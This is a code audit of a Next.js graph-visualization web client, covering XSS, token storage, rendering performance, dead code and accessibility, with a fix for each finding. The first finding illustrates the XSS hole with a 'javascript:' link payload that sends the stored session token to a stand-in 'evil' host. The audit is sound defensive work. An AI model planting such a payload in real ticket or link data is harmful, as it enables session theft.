# Audit 12 — Next.js visualization client (`apps/web/`)

Scope: all of `apps/web/app` (lib, workspace, canvas, components, drawer, settings, mock, api routes).
Method: full read of every non-test source file (77 files).

---

### [SEVERITY: HIGH] Ticket / pull-request URLs reach `href` with no scheme validation — `javascript:` XSS
- **File:** `apps/web/app/lib/nodeOverlay.ts:188`, `:204`; rendered at `apps/web/app/workspace/drawer/nodeModuleRenderers.tsx:145` and `:290`
- **Code:**
```ts
// nodeOverlay.ts — parser accepts ANY string
pullRequestUrl: nullableString(item, 'pullRequestUrl'),
...
url: nullableString(item, 'url'),
```
```tsx
// nodeModuleRenderers.tsx:144-148
<a href={change.pullRequestUrl} target="_blank" rel="noreferrer noopener">
// nodeModuleRenderers.tsx:289-293
<a href={ticket.url} target="_blank" rel="noreferrer noopener">
```
- **Why it's wrong:** `nullableString` only checks `typeof value === 'string'`. Every other field in this file is shape-validated, but the two fields that become live links are not. A Jira/Linear issue whose synced `url` is `javascript:fetch('//evil/'+localStorage['sayre.session.token'])`, or a `pullRequestUrl` of `data:text/html,...`, executes in the workspace origin on one click. The same class of value **is** validated 100 lines away in the sibling parser — `apps/web/app/lib/productTree.ts:163-174` explicitly rejects any protocol that is not `http:`/`https:` — so this is a known-and-missed check, not an unknown risk. `rel="noreferrer noopener"` does nothing against a `javascript:` scheme. Combined with the finding below (bearer token in `localStorage`), one click is full session takeover.
- **Fix:** Port `productTree.ts`'s protocol guard into `nodeOverlay.ts` for `pullRequestUrl` and `specificTickets[].url` (reject non-`http(s)`, return `null`), and add a shared `safeExternalUrl()` helper in `app/lib/` used by every `href={...}` site (`nodeModuleRenderers.tsx:145`, `:290`, `FeatureDrawer.tsx:345`).

---

### [SEVERITY: HIGH] Session bearer token stored in `localStorage` alongside an httpOnly cookie that already works
- **File:** `apps/web/app/lib/coreFetch.ts:9`, `:19`, `:30`
- **Code:**
```ts
export const SESSION_TOKEN_STORAGE_KEY = 'sayre.session.token';
...
return window.localStorage.getItem(SESSION_TOKEN_STORAGE_KEY);
...
window.localStorage.setItem(SESSION_TOKEN_STORAGE_KEY, token);
```
- **Why it's wrong:** The app *already* mirrors the same token into an httpOnly, SameSite=Lax cookie (`app/api/session/route.ts:35-42`), and every BFF proxy already falls back to that cookie (`app/api/core/[...path]/route.ts:241-242`, `app/api/mcp-settings/[[...path]]/route.ts:32-36`). So the `localStorage` copy is redundant for HTTP calls — its only unique consumer is the WebSocket first-frame auth (`app/workspace/state.tsx:836-838`). Keeping a long-lived bearer in `localStorage` means any script execution in the origin (see finding above, or any future dependency compromise) exfiltrates a full session. The `/auth/complete` page goes to real trouble to keep the token out of the URL and browser history (`app/auth/complete/page.tsx:43-45`) and then parks it in the most script-readable store available.
- **Fix:** Drop the `localStorage` copy. Have the gateway accept the `sayre_session` cookie on the WS upgrade, or add a short-lived, single-use WS ticket endpoint on the BFF (`GET /api/session/ws-ticket`, cookie-authenticated, 30s TTL) and send that as the first frame instead of the session token. `coreFetch` then relies on `credentials: 'same-origin'` alone.

---

### [SEVERITY: HIGH] Repository-object identity churn: WebSocket reconnect + full graph refetch every 2.5 s during ingestion
- **File:** `apps/web/app/workspace/state.tsx:384-390`, `:726-736`, `:908-915`, `:565-572`
- **Code:**
```ts
const scope = useMemo<WorkspaceScope | null>(
  () => repository !== null && refName !== null
    ? { repositoryId: repository.id, refName } : null,
  [refName, repository],          // <- `repository` is an OBJECT from the catalog
);
...
// polls the catalog every 2.5s while any repo is still ingesting
const timer = setTimeout(reloadCatalog, 2_500);
...
}, [allowLocalGatewayFallback, gatewayWsUrl, reloadGraph, reloadOverlay, repository, source.id]);
```
- **Why it's wrong:** `setCatalog(nextCatalog)` installs freshly JSON-parsed objects on every poll, so `repository` gets a new identity every 2.5 seconds even when nothing changed. That new identity invalidates (a) the realtime effect — cleanup sends `unsubscribe`, closes the socket, and `connect()` opens a brand-new one, re-authing and re-subscribing; (b) `scope`, which re-runs the graph-load effect at line 515 → a full `technical-tree`/`product-tree` refetch; (c) the provider-state poll at line 574. The poll is active for exactly as long as any repository is in `readiness === 'registered'` — i.e. the whole first ingestion, which is minutes. `SettingsPanel.tsx:149-154` fires `reloadCatalog()` on its own 2.5 s loop too, so with Settings open the churn doubles. Net effect on a real repo: a WebSocket connect storm plus a multi-MB tree request every 2.5 s per open tab, for the entire time a new repo is importing — precisely when the backend is most loaded.
- **Fix:** Key the effects on primitives, not objects: `const scope = useMemo(..., [refName, repository?.id])`, and change the realtime effect deps from `repository` to `repository?.id`. Optionally reconcile `setCatalog` to preserve object identity when the payload is deep-equal.

---

### [SEVERITY: MEDIUM] Product canvas rebuilds its O(features²) connection graph on every parent render
- **File:** `apps/web/app/workspace/components/WorkspaceShell.tsx:543`
- **Code:**
```tsx
<ProductTreeCanvas
  graphNodes={graph.nodes}
  graphEdges={graph.edges.filter(isStructuralEdge)}   // new array every render
```
- **Why it's wrong:** The inline `.filter()` produces a new array identity on every `Workspace` render. `ProductTreeCanvas.tsx:131-134` memoizes `connections` on `[features, graphEdges]`, so the memo never hits. `buildProductFeatureConnections` (`canvas/productGraph.ts:306-324`) is an explicit O(F²) pairwise scan over all features plus an O(E × owners²) pass over every import edge; `placements`, `nodes`, and `edges` all depend on it, so the entire Product layout is recomputed. `Workspace` re-renders on every keystroke in the search box, every drawer open, every canvas resize. On a repo with a few hundred inferred features this is tens of thousands of set operations per keystroke.
- **Fix:** Hoist it: `const structuralEdges = useMemo(() => graph.edges.filter(isStructuralEdge), [graph.edges]);` in `Workspace` and pass that. The same array can feed the `technicalProjection`/`onboardingProjection` memos at lines 277 and 334, which each allocate their own copy today.

---

### [SEVERITY: MEDIUM] A realtime push silently destroys an in-progress Agent/Skill MD draft
- **File:** `apps/web/app/workspace/drawer/AgentSkillModule.tsx:68-75`, triggered from `apps/web/app/workspace/state.tsx:876-877`
- **Code:**
```tsx
useEffect(() => {
  setEditing(false);
  setDraft(current?.content ?? starterAgentSkillContent(nodeName));
  ...
}, [overlay?.nodeId, current?.content, nodeName]);
```
```ts
// state.tsx — on any graph.delta for this repo
reloadGraph();
reloadOverlay();
```
- **Why it's wrong:** `reloadOverlay()` bumps `overlayVersion`, and the overlay effect (`state.tsx:668`) calls `setNodeOverlay(null)` before refetching. `current?.content` therefore flips to `undefined`, the reset effect fires, `setEditing(false)` runs and the textarea's content is replaced with the starter template. Any commit pushed to the repository while an admin is halfway through writing an Agent/Skill MD wipes their unsaved work with no warning and no undo. The `dirty` flag is computed but never used to guard the reset.
- **Fix:** Guard the reset on the node actually changing, not on content identity: `useEffect(..., [overlay?.nodeId])`, and when `editing && dirty` is true, keep the draft and surface a non-destructive "this document changed elsewhere — reload?" affordance (the conflict UI at line 252 already exists and can be reused).

---

### [SEVERITY: MEDIUM] No error boundary anywhere in the app
- **File:** `apps/web/app/` — no `error.tsx`, no `global-error.tsx`, no `componentDidCatch`/`getDerivedStateFromError` in any file
- **Code:** (absence) — reachable throw sites include:
```ts
// app/lib/scaleGraph.ts:150,153,184 — runs inside SigmaCanvas's effect
throw new Error('Sigma accepts only server-filtered canvas payloads');
throw new Error('visible node-count signal does not match the authorized payload');
throw new Error(`edge ${edge.id} references a node outside the authorized payload`);
// app/workspace/viewRegistry.ts:72
throw new Error(`Unknown workspace view: ${id}`);
// app/workspace/state.tsx:1017 and technicalExpansionState.tsx:404
throw new Error('useWorkspace must be used inside <WorkspaceProvider>.');
```
- **Why it's wrong:** Next.js App Router only renders a fallback if an `error.tsx` exists in the segment. With none, any throw from a canvas, drawer, or Sigma effect unmounts the whole React tree and leaves a blank white page with no reload affordance — the user has no path back except a manual refresh, and the failure is invisible in product telemetry. This is a defensive codebase (every response parser fails closed by throwing), which makes the missing boundary more consequential, not less: the fail-closed design is what produces the throws.
- **Fix:** Add `apps/web/app/error.tsx` (segment-level, with a reset button) and `apps/web/app/global-error.tsx`. Optionally wrap `<Workspace/>` inside `WorkspaceBody` in a local boundary so a canvas crash degrades to "canvas unavailable" without taking the top bar and settings with it.

---

### [SEVERITY: MEDIUM] Both renderers' full layouts are computed even though only one renders
- **File:** `apps/web/app/workspace/canvas/TechnicalTreeCanvas.tsx:172-326` and `:328-357`, consumed at `:359-370`
- **Code:**
```tsx
const { nodes, edges } = useMemo(() => { ... layoutTree(graphNodes, ...) ... }, [...]);
const sigmaPayload = useMemo<AuthorizedCanvasPayload>(() => {
  const positions = layoutScalableTree(graphNodes, ...);
  ...
}, [graphEdges, graphNodes, portraitViewport, rootLabel]);

if (renderer === 'sigma') { return <SigmaCanvas payload={sigmaPayload} ... />; }
return <ReactFlow nodes={nodes} edges={edges} ... />;
```
- **Why it's wrong:** Sigma is only selected above 500 visible nodes, which only happens in "everything" mode — exactly the case where `layoutTree` is most expensive. In that path the component still runs a full recursive tree layout over every node, allocates a React Flow `Node` object with a `data` payload and closures per node, and maps every edge — all thrown away. Symmetrically, the React Flow path still runs `layoutScalableTree` over the whole graph. The same pattern repeats one level up: `WorkspaceShell.tsx:269` and `:330` compute **both** `technicalProjection` and `onboardingProjection` (each calling `buildFileTreeModel` over the whole graph) regardless of which view is active, so the Product view pays for two full technical projections it never reads.
- **Fix:** Split into two child components (`<TechnicalReactFlow>` / `<TechnicalSigma>`) so React only mounts and memoizes the active one, or gate each memo body on `renderer`. In `WorkspaceShell`, gate `technicalProjection` on `isTechnical` and `onboardingProjection` on `isOnboarding`.

---

### [SEVERITY: MEDIUM] Tarjan SCC + topological layering of the full import graph runs in the browser
- **File:** `apps/web/app/lib/prerequisiteGraph.ts:57-294`, invoked from `apps/web/app/lib/onboardingTree.ts:253` inside the client fetch path
- **Code:**
```ts
export function toOnboardingTreePresentation(response: OnboardingTreeResponse) {
  const prerequisite = derivePrerequisiteGraph(response.nodes, response.edges);
```
- **Why it's wrong:** `derivePrerequisiteGraph` reverses every `IMPORTS` edge, runs iterative Tarjan strongly-connected-components over all file nodes, condenses the graph, and does longest-path layering — all on the main thread, inside `fetchOnboardingTree`. CLAUDE.md is explicit that "heavy graph computation stays server-side in the Graph Query Service" and that graphology-class client code is for "local filter/subgraph/layout" only. SCC + condensation + topological layering is graph traversal, not layout, however it is framed in the file header. It also blocks the UI thread on the fetch-resolution tick, and it means every client re-derives the same reading order the server could compute and cache once per revision. To be clear on the security side: it makes **no authorization decision** — the payload is already server-filtered and `parseOnboardingTreeResponse` (`onboardingTree.ts:201-206`) rejects any edge whose endpoint is outside the authorized node set — so this is an architecture/perf violation, not an RBAC one.
- **Fix:** Move `derivePrerequisiteGraph` into the Graph Query Service and return `{layer, groupId, groupSize}` on each node plus the derived `PREREQUISITE` edges in the onboarding-tree response. Keep the client function as a pure presentation fallback for the fixture lab only.

---

### [SEVERITY: MEDIUM] `/mock` fixture workspace ships as a production route; fixture data is statically imported into the live bundle
- **File:** `apps/web/app/mock/page.tsx:26-32`, `apps/web/app/workspace/dataSource.ts:13-21`, `apps/web/app/workspace/state.tsx:15`
- **Code:**
```ts
// dataSource.ts — top-level static import, same module as liveWorkspaceDataSource
import {
  DEFAULT_REPOSITORY_ID, FEATURES, GRAPH_EDGES, GRAPH_NODES,
  NODE_OVERLAYS, PROVIDER_SETTINGS, REPOSITORIES,
} from '../mock/fixtures';
```
```tsx
// app/mock/page.tsx
export default function MockPage() {
  return (<MockProvider><WorkspaceShell /></MockProvider>);
}
```
- **Why it's wrong:** `next.config.mjs` is empty — no route exclusion, no build-time gating. `/mock` is therefore a real, unauthenticated production route rendering the full workspace shell plus a `ControlPanel` that can flip session/access/role/backend/semantic state at will. Because `fixtureWorkspaceDataSource` (~270 lines) lives in the same module as `liveWorkspaceDataSource` and `fixtures.ts` (590 lines of graph nodes, edges, features, overlays, provider settings) is a static import, none of it can be tree-shaken out of the live client bundle. The fixture content itself is fictional (`acme/atlas`) so there is no data leak, but shipping a state-manipulation debug console at a guessable path is a needless surface, and it inflates every user's first-load payload.
- **Fix:** Move `fixtureWorkspaceDataSource` and `fixtures.ts` behind a dynamic `import()` guarded by `process.env.NODE_ENV !== 'production'`, and either delete `app/mock/` from production builds or gate it with a `middleware.ts` 404 when `NODE_ENV === 'production'`. `DEFAULT_REPOSITORY_ID` should be inlined into `state.tsx` rather than pulled from the fixture module.

---

### [SEVERITY: MEDIUM] Two dead BFF proxy routes bypass the `/api/core` allowlist and have drifted from its auth handling
- **File:** `apps/web/app/api/provider-settings/[[...purpose]]/route.ts:14-20`, `apps/web/app/api/provider-state/[repoId]/route.ts:33-45`
- **Code:**
```ts
// provider-settings — forwards any Authorization header, no Bearer check, no cookie fallback
function forwardedHeaders(request: NextRequest, hasBody: boolean): Headers {
  const authorization = request.headers.get('authorization');
  if (authorization) headers.set('authorization', authorization);
```
```ts
// provider-state — no response size bound, no cookie fallback
const payload: unknown = await response.json();
return NextResponse.json(payload, { status: response.status });
```
- **Why it's wrong:** No client code calls either route — the app reaches both upstreams through `/api/core/settings/model-providers` and `/api/core/repos/{id}/provider-state` (`dataSource.ts:390`, `providerState.ts:88`). They are live, publicly reachable Next routes that proxy to `CORE_INTERNAL_BASE_URL` outside the carefully-maintained method+path+query allowlist in `api/core/[...path]/route.ts:21-235`. They have already drifted: `/api/core` validates the Bearer format and falls back to the `sayre_session` cookie; `provider-settings` does neither; `provider-state` streams the upstream body with no `MAX_RESPONSE_BYTES` cap while `/api/core` bounds it at 10 MB. Not currently exploitable (core still 401s a request with no credential), but this is duplicate attack surface that no one is maintaining and that no test exercises against the allowlist.
- **Fix:** Delete `app/api/provider-settings/` and `app/api/provider-state/` and their tests. If either is meant to stay, add the route to `coreRoute()` in `api/core/[...path]/route.ts` instead so there is exactly one proxy with one auth policy.

---

### [SEVERITY: MEDIUM] Opening the Product view fetches the entire Technical Tree a second time, just to compute a percentage
- **File:** `apps/web/app/workspace/dataSource.ts:306-318`, `:212-238`
- **Code:**
```ts
const [presentation, technicalTree] = await Promise.all([
  fetchProductTree(scope.repositoryId, scope.refName, { signal }),
  fetchTechnicalTreeResponse(scope.repositoryId, { refName: scope.refName, signal })
    .catch(...),
]);
```
- **Why it's wrong:** The second request pulls every Folder and File node in the repository so that `summarizeProductCoverage` can produce four integers (`totalFileCount`, `mappedFileCount`, `unmappedFileCount`, `mappedPercent`) for a status-line string. On a large repo that doubles the bytes and server work for every Product view load — and, per the finding above, that load repeats every 2.5 s during ingestion. The import-edge enrichment at lines 323-329 also discards the whole edge list except `IMPORTS` edges whose endpoints are both product nodes.
- **Fix:** Return `productCoverage` (and the cross-feature `IMPORTS` edges) directly on the `product-tree` response from core, which already has both node sets in hand. Delete the second fetch.

---

### [SEVERITY: MEDIUM] `FeatureDrawer` resolves feature members with a linear scan per member
- **File:** `apps/web/app/workspace/drawer/FeatureDrawer.tsx:44-56`, `:57-99`
- **Code:**
```tsx
feature.memberIds
  .map((fileId) => graph.nodes.find((node) => node.id === fileId))
  .filter(...)
```
- **Why it's wrong:** O(members × nodes). A 500-file feature in a 10,000-node repo is 5M comparisons, and the memo's dep is the whole `graph` object, so it re-runs whenever anything on the graph changes. The `relatedFeatures` memo directly below re-runs the same O(F²) `buildProductFeatureConnections` that `ProductTreeCanvas` already computed for the identical inputs, again keyed on `graph`.
- **Fix:** Build one `Map<string, GraphNode>` in the provider (or a `useMemo` keyed on `graph.nodes`) and index into it; lift `connections` into `WorkspaceGraph` so the canvas and the drawer share one computation.

---

### [SEVERITY: MEDIUM] Projection cache key concatenates every visible node id into one string
- **File:** `apps/web/app/workspace/technicalExpansion.ts:527-533`
- **Code:**
```ts
const key = [
  intent.mode,
  budget,
  ...graphNodes.filter((node) => visibleNodeIds.has(node.id)).map((node) => node.id),
].join(':');
```
- **Why it's wrong:** In `balanced`/`focus` this is bounded by the ≤96 budget and harmless. In `full` mode every node is visible (line 355-361 ignores the budget), so on a 20,000-node repo this allocates and joins a ~740 KB string on every projection recompute — and it is then passed as the `layoutKey` prop (`WorkspaceShell.tsx:528`) into a `useEffect` dep array, where React string-compares it on every render.
- **Fix:** Use a cheap stable digest instead — `${intent.mode}:${budget}:${visibleNodeIds.size}:${projectionCounter}` where the counter increments when the visible set actually changes, or hash the sorted ids with a rolling 32-bit hash.

---

### [SEVERITY: LOW] The URL-parameter validator exists but is never wired up
- **File:** `apps/web/app/lib/homeScope.ts:5-27` (dead), vs `apps/web/app/page.tsx:17-21` (live)
- **Code:**
```ts
// homeScope.ts — UUID + refs/ regex validation. Only importer is homeScope.test.ts.
const UUID_RE = /^[0-9a-f]{8}-.../i;
const REF_RE  = /^refs\/[^\s]{1,500}$/;
```
```ts
// page.tsx — what actually runs
function singleParam(value: string | string[] | undefined): string | null {
  if (typeof value !== 'string') return null;
  const normalized = value.trim();
  return normalized.length > 0 ? normalized : null;
}
```
- **Why it's wrong:** `resolveHomeScope` is referenced only by its own test file. The live page accepts any non-empty `repoId`/`refName` from the query string and threads them into `WorkspaceProvider` → `scope` → request URLs. Core validates, so the impact is bounded to wasted 4xx round-trips and a stuck "loading" state on a malformed deep link — but the test suite reports coverage for a guard that is not in the request path.
- **Fix:** Call `resolveHomeScope(searchParams)` from `page.tsx` for `repoId`/`refName` (keeping `initialView`/`initialSettings`, which do validate), or delete `homeScope.ts` and its test.

---

### [SEVERITY: LOW] Live workspace boots in the fixture's optimistic state (`session: 'authenticated'`, `access: 'authorized'`)
- **File:** `apps/web/app/workspace/state.tsx:88-110`, `:268-283`
- **Code:**
```ts
const FIXTURE_INITIAL_STATE: WorkspaceState = {
  session: 'authenticated', role: 'admin', access: 'authorized',
  backend: 'available', semantic: 'ready', ... };
...
return {
  ...FIXTURE_INITIAL_STATE,
  role: 'member', realtime: 'not-connected', installation: 'not-installed',
  ...   // session / access / backend / semantic are NOT overridden
};
```
- **Why it's wrong:** `role`, `realtime`, and `installation` are deliberately failed closed, but `session`, `access`, `backend`, `semantic`, and `canvasData` are inherited from the fixture defaults. A signed-out visitor at `/` gets the full workspace chrome (top bar, view rail, canvas in "loading") until the `/repositories` fetch 401s, instead of the sign-in state. No data leaks — nothing has been fetched — but it's an inconsistent fail-open in a state object where the neighbouring fields fail closed, and it is the kind of default that becomes a real bug when someone adds a state that renders content optimistically.
- **Fix:** Give live mode its own literal initial state (`session: 'signed-out'` when `getStoredSessionToken()` is null, `access: 'no-repositories'`, `semantic: 'generating'`) rather than spreading `FIXTURE_INITIAL_STATE`.

---

### [SEVERITY: LOW] The 500-node threshold is implemented twice; the tested implementation is the dead one
- **File:** `apps/web/app/lib/scaleGraph.ts:3`, `:87-92` (dead) vs `apps/web/app/workspace/rendererRegistry.ts:34`, `:39-50` (live)
- **Code:**
```ts
// scaleGraph.ts — referenced only by scaleGraph.test.ts / technicalTree.test.ts / productTree.test.ts
export const SIGMA_NODE_THRESHOLD = 500;
export function rendererForVisibleNodeCount(visibleNodeCount: number): GraphRenderer {
  return visibleNodeCount > SIGMA_NODE_THRESHOLD ? 'sigma' : 'react-flow';
}
```
```ts
// rendererRegistry.ts — what WorkspaceShell.tsx:369 actually calls
{ id: 'sigma', supports: ['technical'], minimumNodeCount: 501, ... }
```
- **Why it's wrong:** Two independent encodings of the same architectural threshold, and the test suite asserts against the one the app does not use (`scaleGraph.test.ts:12-15`). Separately, the threshold is only reachable in one mode: `viewportTechnicalNodeBudget` caps visible nodes at 96 (`technicalExpansion.ts:193`), so `balanced` and `focus` can never exceed 501 and Sigma engages only when the user explicitly picks "everything" mode (which skips the budget at `technicalExpansion.ts:355-361`). That appears intentional, but it means the WebGL path is exercised by roughly no one by default and the React Flow path is what needs the perf attention.
- **Fix:** Delete `SIGMA_NODE_THRESHOLD`/`rendererForVisibleNodeCount` from `scaleGraph.ts`, have `rendererRegistry` be the single source (`minimumNodeCount: SIGMA_NODE_THRESHOLD + 1` if you want the constant), and repoint the three test files at `rendererFor()`.

---

### [SEVERITY: LOW] `Math.min(...xs)` / `Math.max(...xs)` spread over one element per node
- **File:** `apps/web/app/workspace/canvas/layout.ts:270-272`
- **Code:**
```ts
const xs = [...rawPositions.values()].map(({ x }) => x);
const minX = Math.min(...xs);
const maxX = Math.max(...xs);
```
- **Why it's wrong:** This is the Sigma/large-graph layout path — the one place the array is genuinely big. Spreading an array as function arguments hits the engine's argument limit (~65k–125k depending on the engine) and throws `RangeError: Maximum call stack size exceeded`. A monorepo with >100k files would crash the canvas, and with no error boundary (see above) that blanks the page.
- **Fix:** Single reduce pass: `let minX = Infinity, maxX = -Infinity; for (const {x} of rawPositions.values()) { if (x < minX) minX = x; if (x > maxX) maxX = x; }`.

---

### [SEVERITY: LOW] BFF forwards the upstream `Location` header to the browser unvalidated
- **File:** `apps/web/app/api/core/[...path]/route.ts:347-353`
- **Code:**
```ts
if (route.redirect && response.status >= 300 && response.status < 400) {
  const location = response.headers.get('location');
  if (location === null) { return NextResponse.json({ error: '...' }, { status: 502 }); }
  return NextResponse.redirect(location, response.status);
}
```
- **Why it's wrong:** The three `redirect: true` routes (`auth/github/login`, `integrations/github/install`, `integrations/jira/connect`) hand the browser whatever `Location` core returns, with no scheme or host check. Core is trusted today, so this is defence-in-depth rather than a live bug — but the login redirect is exactly the hop an open-redirect chain wants, and `app/lib/authComplete.ts:20-32` already implements the corresponding same-origin guard for the other direction, so the asymmetry is worth closing.
- **Fix:** Allowlist the expected redirect hosts (`github.com`, `*.atlassian.com`, same-origin) before calling `NextResponse.redirect`, returning 502 otherwise.

---

### [SEVERITY: LOW] Accessibility gaps on canvas interaction
- **File:** `apps/web/app/components/SigmaCanvas.tsx:319-324`, `:330-340`; `apps/web/app/workspace/canvas/ProductFeatureNode.tsx:143`
- **Code:**
```tsx
<div ref={containerRef} className="sigma-canvas" role="img"
  aria-label={`WebGL repository graph with ${...} authorized nodes`} />
...
<g key={boundary.id} role="button" tabIndex={0} ... onKeyDown={...}>
```
- **Why it's wrong:** (a) The Sigma canvas is a single `role="img"` — none of its nodes are keyboard reachable or announced, so the >500-node view is keyboard-inaccessible; the React Flow path has the same issue but `FileTreePane` (which is genuinely well done: full arrow/Home/End/Enter handling, `aria-level`/`posinset`/`setsize`, roving tabindex at `FileTreePane.tsx:124-180`, `:311-316`) provides an equivalent path only in the Technical view. (b) SVG `<g role="button">` is not reliably exposed by all AT even with `tabIndex`; a `<foreignObject>` button or an off-canvas list is safer. (c) `ProductFeatureNode.tsx:143` marks the feature header `aria-hidden="true"`, so the name/file-count/team text is screen-reader invisible — the frame button's `aria-label` covers the name but not the counts.
- **Fix:** Offer the Explorer pane (or an equivalent list) in the Product and Onboarding views too, so every canvas has a keyboard-navigable twin; include the counts in the frame button's `aria-label`.

---

### [SEVERITY: LOW] Substantial dead exports carrying test coverage
- **File:** `apps/web/app/lib/technicalTree.ts:86,260,308,360`; `apps/web/app/lib/productTree.ts:420,433`; `apps/web/app/lib/scaleGraph.ts:3,49,87,94`; `apps/web/app/lib/providerState.ts:102`; `apps/web/app/lib/homeScope.ts:5`; `apps/web/app/workspace/components/AskSayrePanel.tsx:12`
- **Code:** (verified by grep — every one of `fetchTechnicalTree`, `toAuthorizedCanvasPayload`, `toReactFlowElements`, `normalizeRepositoryIdParam`, `toProductTreeReactFlowNodes`, `selectedFeaturePanel`, `createScaleFixture`, `rendererForVisibleNodeCount`, `SIGMA_NODE_THRESHOLD`, `GRAPHLOGY_PRESENTATION_ALLOWLIST`, `useProviderState`, `resolveHomeScope`, `AskSayreDock` is referenced only from `*.test.ts` or not at all)
- **Why it's wrong:** Roughly 300 lines of unreferenced code with green tests. `GRAPHLOGY_PRESENTATION_ALLOWLIST` in particular is asserted by `scaleGraph.test.ts:44-45` as if it enforced the graphology architecture rule; it is an inert string array that constrains nothing. `useProviderState` is a second, unused implementation of the polling loop `state.tsx:574-657` hand-rolls.
- **Fix:** Delete the dead exports and their tests, or wire them in. Replace the `GRAPHLOGY_PRESENTATION_ALLOWLIST` assertion with a lint rule that actually forbids graph traversal calls in client modules.

---

## Explicit negatives (checked, clean)

- **Client-side RBAC filtering: none found.** Every response parser hard-requires `authorization: 'server-filtered'` and fails closed (`technicalTree.ts:189`, `productTree.ts:227`, `onboardingTree.ts:172`, `nodeOverlay.ts:143`, `repositoryCatalog.ts:59`). `onboardingTree.ts:201-206` even rejects the response if the server leaks an edge endpoint outside the authorized node set. The one function shaped like client-side authz — `state.tsx:286-296 visibleRepositories()`, filtering on `repo.restricted` — is a no-op in live mode: `restricted` is documented fixture-only (`types.ts:45-46`) and `parseRepositoryCatalogResponse` never sets it. `isAdmin` gates only affordance visibility; every gated action is separately 401/403-handled against core.
- **Function/Class nodes on canvas: none.** All three parsers reject any node whose `label` is not `Folder`/`File` (`technicalTree.ts:140`, `productTree.ts:129`, `onboardingTree.ts:98`), and the response is discarded wholesale rather than filtered. `NodeKind` is `'Folder' | 'File'`.
- **XSS via HTML injection: none.** Zero `dangerouslySetInnerHTML`, `innerHTML`, `document.write`, `eval`, or `new Function` in the app. Markdown is rendered as text in a `<pre>` (`AgentSkillModule.tsx:220`). The only injection vector is the `href` scheme issue reported above.
- **Secrets in the client bundle: none.** One `NEXT_PUBLIC_*` var total (`NEXT_PUBLIC_GATEWAY_WS_URL`, `page.tsx:44`), and `realtime.ts:82-98` rejects a configured WS URL carrying credentials, a query string, or a fragment. No hardcoded keys or internal hostnames; fixture data is fictional. The MCP one-time token is displayed once and only held in component state (`McpSettings.tsx:277`).
- **Fetch race conditions: handled.** Every fetching effect uses an `AbortController` plus an `active` flag and checks both before calling `setState` (`state.tsx:392-450`, `:515-572`, `:659-688`; `SettingsPanel.tsx:138-170`, `:389-409`; `McpSettings.tsx:96-110`). No stale-response-overwrites-fresh path found. Timers and listeners are cleaned up consistently, including the WebSocket reconnect/settle timers (`state.tsx:897-907`) and the Sigma camera listeners (`SigmaCanvas.tsx:137-143`, `:273-275`).
